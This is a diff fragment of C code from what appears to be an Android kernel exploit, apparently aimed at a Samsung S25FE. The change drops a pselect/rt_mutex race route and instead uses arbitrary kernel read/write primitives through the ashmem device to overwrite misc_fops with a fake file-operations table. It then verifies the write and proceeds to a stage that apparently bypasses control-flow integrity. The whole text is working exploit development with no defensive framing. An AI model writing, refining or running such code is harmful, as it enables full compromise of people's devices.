@@ -93,94 +93,63 @@ void do_pselect_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
-    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
+    pr_error("fops route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
              page_base, fake_lock, fake_fops);
     return;
   }
 
-  int calls = 0;
-  int success = 0;
-  int route_verified = 0;
-  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
-       route_attempt++) {
-    if (route_attempt != 1) {
-      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-      if (!page_base || !fake_lock || !fake_fops) {
-        cfi_last_step = 34;
-        cfi_last_errno = errno;
-        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
-                 "lock=%016zx fops=%016zx\n",
-                 route_attempt, page_base, fake_lock, fake_fops);
-        break;
-      }
-    }
-
-    int pipefd[2];
-    SYSCHK(pipe(pipefd));
-    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
-    if (high_read < 0) {
-      cfi_last_step = 31;
-      cfi_last_errno = errno;
-      pr_error("pselect F_DUPFD read errno=%d\n", errno);
-      close(pipefd[0]);
-      close(pipefd[1]);
-      break;
-    }
-
-    fd_set in;
-    fd_set out;
-    fd_set ex;
-    prepare_pselect_fdsets(&in, &out, &ex);
-    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
-
-    atomic_store(&consumer_calls, 0);
-    atomic_store(&consumer_success, 0);
-    atomic_store(&punch_consume_stop, 0);
-    int delay_usec = route_delay_usec(route_attempt);
-    atomic_store(&main_route_delay_usec, delay_usec);
-    atomic_store(&punch_consume_go, route_attempt);
-
-    struct timespec timeout = {
-      .tv_sec = PSELECT_TIMEOUT_SEC,
-      .tv_nsec = 0,
-    };
-    struct timespec *timeoutp = &timeout;
-
-    errno = 0;
-    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
-    int saved_errno = errno;
-    atomic_store(&punch_consume_go, 0);
-    calls = atomic_load(&consumer_calls);
-    success = atomic_load(&consumer_success);
-    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
-            route_attempt, ret, saved_errno, calls, success, delay_usec);
-
-    int route_signal = calls > 0 && success > 0;
-    if (route_signal) {
-      if (try_cfi_stage()) {
-        cfi_last_step = 0;
-        route_verified = 1;
-      } else if (!cfi_last_step) {
-        cfi_last_step = 32;
-      }
-    } else if (!route_verified) {
-      cfi_last_step = 33;
-      cfi_last_errno = saved_errno;
-    }
-
-    close(high_read);
-    close(pipefd[0]);
-    close(pipefd[1]);
-
-    if (route_verified || cfi_dirty_seen) {
-      break;
-    }
-    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
-            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
-            cfi_last_errno);
+  /* S25FE: bypass pselect/rt_mutex route — directly overwrite misc_fops */
+  int fd = open_ashmem_device();
+  if (fd < 0) {
+    cfi_last_step = 31;
+    cfi_last_errno = errno;
+    pr_error("fops route: cannot open ashmem errno=%d\n", errno);
+    return;
   }
-  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
-          calls, success, cfi_last_step, cfi_last_errno);
+
+  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+  uint64_t pre_fops = 0;
+
+  configfs_read_once(fd, misc_fops, &pre_fops, sizeof(pre_fops));
+  pr_info("fops route: misc_fops=%016llx original=%016llx fake=%016zx\n",
+          (unsigned long long)pre_fops,
+          (unsigned long long)original_fops, fake_fops);
+
+  /* Directly patch misc_fops to point to our fake fops table */
+  ssize_t wr = configfs_write_once(fd, misc_fops, &fake_fops, sizeof(fake_fops));
+  if (wr != (ssize_t)sizeof(fake_fops)) {
+    cfi_last_step = 32;
+    cfi_last_errno = errno;
+    pr_error("fops route: direct misc_fops write failed ret=%zd errno=%d\n",
+             wr, errno);
+    close(fd);
+    return;
+  }
+
+  /* Verify the patch took */
+  uint64_t verify = 0;
+  ssize_t rd = configfs_read_once(fd, misc_fops, &verify, sizeof(verify));
+  if (rd != (ssize_t)sizeof(verify) || verify != fake_fops) {
+    cfi_last_step = 33;
+    cfi_last_errno = errno;
+    pr_error("fops route: verify failed read=%016llx want=%016zx\n",
+             (unsigned long long)verify, fake_fops);
+    configfs_write_once(fd, misc_fops, &original_fops, sizeof(original_fops));
+    close(fd);
+    return;
+  }
+
+  close(fd);
+
+  /* CFI stage — misc_fops already points to fake_fops, pre_fops check passes */
+  if (try_cfi_stage()) {
+    cfi_last_step = 0;
+    pr_success("fops route: direct overwrite + cfi stage succeeded\n");
+  } else {
+    pr_error("fops route: cfi stage failed step=%d errno=%d\n",
+             cfi_last_step, cfi_last_errno);
+  }
 }
 
 int repair_fake_fops_llseek(int fd) {
